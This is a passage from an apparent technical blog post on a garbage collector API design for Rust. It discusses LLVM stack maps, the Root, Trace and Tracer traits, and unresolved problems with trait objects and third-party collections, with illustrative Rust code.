to talk to Node). Interacting GCs are hard to reason about, though. The current design leaves this
decision up to the GC designer &mdash; while it is possible to let your GCd object contain objects
managed by a different GC, this requires some explicit extra work. Interacting GCs is a <em>very</em> niche
use case<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>, so if this ability isn&rsquo;t something we&rsquo;re adamant on supporting.</p>

<p>We also would like it to be safe to use trait objects with the GC. This raises some concerns which
I&rsquo;ll address in depth later in this post.</p>

<h2>Core design</h2>

<p>The core idea is to use <a href="http://llvm.org/docs/StackMaps.html">LLVM stack maps</a> to keep track of roots.</p>

<p>In a tracing GC, the concept of a &ldquo;root&rdquo; is basically something which can be directly reached
without going through other GC objects. In our case they will be cases of <code>Gc&lt;T&gt;</code> ending up on the
stack or in non-gc heap boxes which themselves are reachable from the stack. Some examples:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">bar</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Bar</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">inner</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `bar` is a root</span>
</span><span class='line'><span class="kd">let</span> <span class="n">bar</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">Bar</span><span class="o">::</span><span class="n">new</span><span class="p">());</span>
</span><span class='line'><span class="c1">// `bar.inner` is not a root, since it can&#39;t be</span>
</span><span class='line'><span class="c1">// accessed without going through `bar`</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `foo.bar` is a root:</span>
</span><span class='line'><span class="kd">let</span> <span class="n">foo</span> <span class="o">=</span> <span class="n">Foo</span><span class="o">::</span><span class="n">new</span><span class="p">();</span> <span class="c1">// This is a root</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// `inner` is not a root, because it is a borrowed reference</span>
</span><span class='line'><span class="kd">let</span> <span class="n">inner</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">bar</span><span class="p">.</span><span class="n">inner</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `rooted_bool` is a root, since it is a `Gc&lt;bool&gt;` on the stack</span>
</span><span class='line'><span class="c1">// (cloning has the same behavior as that on `Rc&lt;T&gt;`: it creates a</span>
</span><span class='line'><span class="c1">// new reference to the same value)</span>
</span><span class='line'><span class="kd">let</span> <span class="n">rooted_bool</span> <span class="o">=</span> <span class="n">bar</span><span class="p">.</span><span class="n">inner</span><span class="p">.</span><span class="n">clone</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `boxed_bar` is a root. While the Gc&lt;Bar&gt; is not on the stack,</span>
</span><span class='line'><span class="c1">// it can be reached without dereferencing another `Gc&lt;T&gt;`</span>
</span><span class='line'><span class="c1">// or passing through a borrowed reference</span>
</span><span class='line'><span class="kd">let</span> <span class="n">boxed_bar</span> <span class="o">=</span> <span class="n">Box</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">Bar</span><span class="o">::</span><span class="n">new</span><span class="p">()));</span>
</span></code></pre></td></tr></table></div></figure>


<p>When figuring out which objects are live (&ldquo;tracing&rdquo;), we need to have this initial set of &ldquo;roots&rdquo;
which contain the list of things directly reachable from the stack. From here, the GC can rifle
through the fields and subfields of the roots till it finds other GCd objects, which it can mark as
live and continue the process with.</p>

<p>Most runtimes for GCd languages have efficient ways of obtaining this list of roots. Contrast this
with conservative collectors like Boehm, which read in the whole stack and consider anything which
looks like a pointer to the GC heap to be a root. rust-gc&rsquo;s approach is inefficient too; because it
incurs an additional reference counting cost on copying and mutation.</p>

<p>However, the list of current roots is known at compile time; it&rsquo;s just a matter of which variables
are live at any point. We store this list of live variables in a per-call-site &ldquo;stack map&rdquo;. To find
all the roots, you walk up the call stack, and for each call site look up its entry in the stack
map, which will contain the stack offsets of all the roots (and other metadata if we need it). LLVM
has native support for this. The stack map is stored in a separate section so there is no runtime
performance hit during regular execution, however some optimizations may be inhibited by turning on
GC.</p>

<p>So basically a GC will have access to a <code>walk_roots&lt;F&gt;(f: F) where F: FnMut(..)</code> intrinsic that will
yield all the roots to the provided function (which can then mark them as such and start tracing).</p>

<p>I&rsquo;m not going to focus on the implementation of this intrinsic for this blog post &mdash; this might
be the subject of a later blog post by <a href="http://github.com/pnkfelix/">Felix</a> who is working on this.</p>

<p>Instead, I&rsquo;m focusing on the higher-level API.</p>

<h2>Identifying rootables</h2>

<p>The first problem we come across with the design mentioned above is that the compiler doesn&rsquo;t yet
know how to distinguish between a root and a non-root. We can&rsquo;t mark <em>every</em> variable as a root;
that would bloat the stack maps and make walking the roots a very expensive operation.</p>

<p>A very simple way of doing this is via a trait, <code>Root</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// in libcore</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">trait</span> <span class="n">Root</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// auto-trait, anything containing</span>
</span><span class='line'><span class="c1">// a Root will itself be Root</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span> <span class="o">!</span><span class="n">Root</span> <span class="k">for</span> <span class="p">..</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// references are never roots</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="p">,</span> <span class="n">T</span><span class="o">&gt;</span> <span class="o">!</span><span class="n">Root</span> <span class="k">for</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">T</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// in a gc impl</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">Root</span> <span class="k">for</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{}</span>
</span></code></pre></td></tr></table></div></figure>


<p>if we detect <code>Root</code> objects that are directly reachable, we consider them to be roots.</p>

<p>This has a flaw, it doesn&rsquo;t actually tell us how to find roots inside container types. What would we
do if there was a <code>Box&lt;Gc&lt;T&gt;&gt;</code> or a <code>Vec&lt;Gc&lt;T&gt;&gt;</code> on the stack? We can stick their entry in the stack
map, but the GC needs to know what to do with them!</p>

<p>We could store some type information in the map and let the GC hardcode how to root each container
type. This isn&rsquo;t extensible though; the GC will have to be able to handle types from arbitrary
crates too. Additionally, we have to solve this problem anyway for tracing &mdash; when tracing we
need to be able to find all values &ldquo;contained&rdquo; within a particular value, which is the same
operation we need to do to find roots.</p>

<p>For this purpose, we introduce the <code>Trace</code> trait:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// in libcore</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">trait</span> <span class="n">Trace</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in libcollections</span>
</span><span class='line'><span class="c1">// (or any third-party collections library)</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&gt;</span> <span class="n">Trace</span> <span class="k">for</span> <span class="n">Vec</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="bp">self</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">i</span><span class="p">.</span><span class="n">trace</span><span class="p">()</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in gc library</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// only allow trace objects</span>
</span><span class='line'><span class="k">struct</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">Trace</span> <span class="k">for</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// mark `self`</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Don&#39;t actually trace contained fields,</span>
</span><span class='line'>        <span class="c1">// because there may be cycles and we&#39;d recurse infinitely</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in consumer of gc library</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// autoderived impl will call `bar.trace()` and `baz.trace()`</span>
</span><span class='line'><span class="cp">#[derive(Trace)]</span>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">bar</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Bar</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">baz</span><span class="o">:</span> <span class="n">SomeType</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>(These traits are unsafe to implement because an incorrect implementation can lead to a
reachable value getting cleaned up by the GC, which is unsafe)</p>

<p>Basically, an implementation of Trace will yield all values owned by the object, unless that object
is a GC struct like <code>Gc&lt;T&gt;</code>, in which case the GC implementor will have it mark the object. This
way, calling <code>.trace()</code> will walk all fields and subfields of an object recursively, until it finds
all of the contained <code>Gc&lt;T&gt;</code>s.</p>

<p>This has an issue with multiple GCs, though &mdash; we don&rsquo;t want the GCs to interact unless they
want to, and with the <code>Trace</code> trait being shared one GC object may accidentally contain a different
GC object.</p>

<p>We need to introduce the concept of a tracer here.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// in libcore</span>
</span><span class='line'>
</span><span class='line'><span class="k">trait</span> <span class="n">Tracer</span> <span class="o">:</span> <span class="nb">Any</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">trait</span> <span class="n">Trace</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">tracer</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">Tracer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// in libcollections</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// impl doesn&#39;t care about the tracer</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&gt;</span> <span class="n">Trace</span> <span class="k">for</span> <span class="n">Vec</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">tracer</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">Tracer</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="bp">self</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">i</span><span class="p">.</span><span class="n">trace</span><span class="p">(</span><span class="n">tracer</span><span class="p">)</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in gc library</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">MyTracer</span> <span class="p">{}</span> <span class="c1">// more complicated tracers may have state</span>
</span><span class='line'><span class="k">impl</span> <span class="n">Tracer</span> <span class="k">for</span> <span class="n">MyTracer</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">Trace</span> <span class="k">for</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">tracer</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">Tracer</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="kd">let</span> <span class="nb">Some</span><span class="p">(</span><span class="n">tracer</span><span class="p">)</span> <span class="o">=</span> <span class="n">tracer</span><span class="p">.</span><span class="n">downcast_mut</span><span class="o">::&lt;</span><span class="n">MyTracer</span><span class="o">&gt;</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// mark self</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">panic</span><span class="p">(</span><span class="s">&quot;Don&#39;t mix GCs!&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="c1">// If you want to support multiple GCs interacting with each other,</span>
</span><span class='line'>            <span class="c1">// you can let this else block trace the contents.</span>
</span><span class='line'>            <span class="c1">// Beware, interacting GCs have subtle safety issues.</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This also makes it easier to distinguish between rooting and tracing operations. While the
operations are similar (&ldquo;to root/trace a value, walk its fields recursively till you find all of the
Gc<T>s, and root/mark <em>those</em>&rdquo;), the code we run at the leaf <code>Gc&lt;T&gt;</code> nodes is different. In the
previous model, this could have been solved with a global static boolean that identifies if the code
is currently walking roots or tracing, but with the <code>Tracer</code> trait object we can just pass in
different tracer values.</p>

<p>We&rsquo;re not yet sure if we should be lumping root walking and tracing in a single trait; so we might
end up with a second <code>Scan</code> trait that works similarly.</p>

<p>Note that we&rsquo;re not getting rid of the Root trait here. This is because <code>Root</code> and <code>Trace</code> have
slightly incompatible purposes &ndash; <code>Root</code> signals to the compiler if something definitely contains
roots, whereas <code>Trace</code> marks things which are safe to put inside a GC. <code>bool</code> is <code>Trace</code>, but not
<code>Root</code>. <code>Vec&lt;Gc&lt;T&gt;&gt;</code> is <code>Trace</code> and <code>Root</code>, <code>Vec&lt;bool&gt;</code> is <code>Trace</code> but not <code>Root</code>. <code>&amp;T</code> and <code>&amp;mut T</code>
are neither. <code>Trace</code> will actually show up in trait bounds for GC code. <code>Root</code> will only be analysed
by the compiler itself, bounds like <code>R: Root</code> probably won&rsquo;t show up.</p>

<p>There should not be any types which are <code>Root</code> but not <code>Trace</code>, because this means the compiler
won&rsquo;t know what to do with them!</p>

<p>Now, when generating the stack map, we include the stack offset of all <code>Root</code> objects in scope, as
well as appropriate dynamic dispatch vtable pointers for the <code>Trace</code> implementation<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. Walking the
stack involves calling the trace method on each entry in the stack map for each call site.</p>

<h2>Unresolved problems</h2>

<p>There are a lot of these. Suggestions very welcome.</p>

<h3>Trait objects</h3>

<p>Trait objects provide an interesting challenge. They may or may not contain roots, but what&rsquo;s more
important is that trait objects in libraries that know nothing about GC may also contain roots.</p>

<p>For example, if a library is dealing with a <code>Box&lt;SomeTrait&gt;</code>, and your code feeds it a
<code>Box&lt;SomeRoot as SomeTrait&gt;</code>, the trait object is now a root. If a gc is triggered while in
this call (perhaps by a callback), then this trait object should be counted as a root.</p>

<p>But this library didn&rsquo;t depend on the GC, and when it was compiled, it wasn&rsquo;t compiled with stack
map entries for this GC object.</p>

<p>There are two solutions here. The first is to recompile everything (including libstd) from scratch
with GC support on, and put all owned trait objects in the stack maps. They will have an extra
generated trace entry in the vtable that will ignore the object if it isn&rsquo;t a root. To put trait
objects inside <code>Gc&lt;T&gt;</code>, you will have to explicitly use <code>Box&lt;Trait+Trace&gt;</code>, however &ndash; this magical
trace entry is just for collecting roots.</p>

<p>The second solution is to simply not allow casting <code>Root</code> objects to owned trait objects. I feel
that there are use cases for both &ndash; the former has extra bloat and requires a custom libstd (which
could be distributed via rustup if necessary), but the latter restricts how you use trait objects.
Servo, for example, would probably prefer the latter since we don&rsquo;t put our DOM objects in owned
trait objects. But other GC users may want maximum flexibility. Letting people choose this via a
codegen flag (which can be controlled via cargo) might be a good idea.</p>

<h3>Should it be <code>Trace&lt;T&gt;</code>?</h3>

<p>There is a dynamic dispatch cost on rooting/tracing any <code>Gc&lt;T&gt;</code> leaf with the tracer model.</p>

<p>This can be obviated by having it be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">trait</span> <span class="n">Trace</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Tracer</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">tracer</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">T</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Most types would implement <code>Trace&lt;T&gt;</code>, and GCs can implement <code>Trace&lt;SpecificTracer&gt;</code>,
and only require their contents to be <code>Trace&lt;SpecificTracer&gt;</code>. This lets the type system
forbid interacting GCs instead of having it done at runtime.</p>

<p>This has multiple downsides, however:</p>

<ul>
<li><code>#[derive(Trace)]</code> becomes <code>#[derive(Trace&lt;MyTracer&gt;)]</code> for things containing <code>Gc&lt;T&gt;</code> (because <code>Gc&lt;T&gt;</code> is not <code>Trace&lt;T&gt;</code> for all <code>T</code>, and macro expansion runs before this information can be computed).</li>
<li>If there are multiple GCs, there are multiple <code>Trace&lt;T&gt;</code> vtable pointers in the stack map. Not all libs know about the other GC when being compiled, so you need to defer generation of these stack map entries somehow.</li>
<li>The heuristics for forbidding types which are <code>Root</code> but not <code>Trace&lt;T&gt;</code> become subtler. You have to effectively forbid types which are <code>Root</code> but do not have an impl of <code>Trace&lt;T&gt;</code> for at least one tracer <code>T</code> that is active in the compilation.</li>
</ul>


<h3>Non-<code>Trace</code> collections on the stack</h3>

<p>If something like the following, defined by a third-party library:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="o">:</span> <span class="n">T</span><span class="p">,</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>doesn&rsquo;t implement <code>Trace</code>, it&rsquo;s still okay to use <code>Foo&lt;RootedThing&gt;</code> on the stack, because we can
figure out that the inner <code>T</code> is what we need to root.</p>

<p>However, if a third-party <code>MyVec&lt;T&gt;</code> (which behaves like a vector) contains <code>RootedThing</code>s, and is
on the stack, the compiler doesn&rsquo;t know what do do with it. Lack of a <code>Trace</code> bound makes it
impossible to put such types on the GC heap, but there&rsquo;s no restriction on putting these types on
the stack. As I mentioned before, we can simply forbid the existence of types which are <code>Root</code> but
not <code>Trace</code> (<code>MyVec&lt;RootedThing&gt;</code> is <code>Root</code>). This is already done with <code>Copy</code> and <code>Drop</code>.</p>

<p>There&rsquo;s a subtle difference between this and the <code>Copy</code>/<code>Drop</code> forbidding. <code>Copy</code> and <code>Drop</code> are
always explicitly implemented. On the other hand, <code>Root</code> is an auto trait and automatically
implements itself on types containing roots. This means that we can&rsquo;t necessarily forbid such types
being created at impl time &mdash; third party collections like above for example won&rsquo;t contain
<code>Root</code> types until they are monomorphised. We can error during monomorphization, but this error
might not be very user-friendly, like template errors in C++.</p>

<p>Another solution is to make <code>Root</code> into <code>?Root</code>, much like <code>?Sized</code>. This means that the writers of
collections will explicitly opt in to allowing GCd things inside them. This probably would lead to a
lot more churn, however. But the diagnostics would be clearer.</p>

<p>Turns out that
<a href="https://play.rust-lang.org/?gist=ad485dc2fc91e5c1aad53051dc207716&amp;version=nightly&amp;backtrace=0">this</a>
actually works with half-decent diagnostics. This doesn&rsquo;t forbid the existence of types which impl
Root but not Trace, however. It simply avoids autoderiving Root on types which aren&rsquo;t Trace. But
this behavior can be changed.
(In fact, it <a href="https://github.com/rust-lang/rust/pull/35745">was changed</a> while this post was being written!)</p>

<p>It becomes more complicated with Trace<T> though.
Having <code>Root&lt;T&gt;</code> might fix this, but then you have to deal with the auto trait generics.</p>

<p>One solution for the auto trait generics is to simple not include <code>Root</code> in the stdlib. Instead,
require code like the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// in gc library</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">MyTracer</span> <span class="p">{</span><span class="cm">/* .. */</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&lt;</span><span class="n">MyTracer</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#[gc_root_trait]</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">trait</span> <span class="n">MyRoot</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&lt;</span><span class="n">MyTracer</span><span class="o">&gt;</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span> <span class="o">!</span><span class="n">MyRoot</span> <span class="k">for</span> <span class="p">..</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&lt;</span><span class="n">MyTracer</span><span class="o">&gt;&gt;</span> <span class="n">MyRoot</span> <span class="k">for</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This can be further simplified by completely removing the rooting trait requirement and instead
require <code>#[gc(tracer=MyTracer)]</code> on all GC structs. This, however, is a bit more special and we lose
the free diagnostics that you get from utilizing the type system.</p>

<h3>Are <code>Root</code>-containing raw pointers <code>Root</code>?</h3>

<p>For the auto-trait to work, types like <code>Vec&lt;ContainsRoot&gt;</code> should also be marked as <code>Root</code>.</p>

<p>This can be done by just marking <code>*const T</code> and <code>*mut T</code> as <code>Root</code> if <code>T</code> is <code>Root</code> using an impl in
libcore. However, borrowed types like <code>Iter</code> will also be dragged into this. We only want types
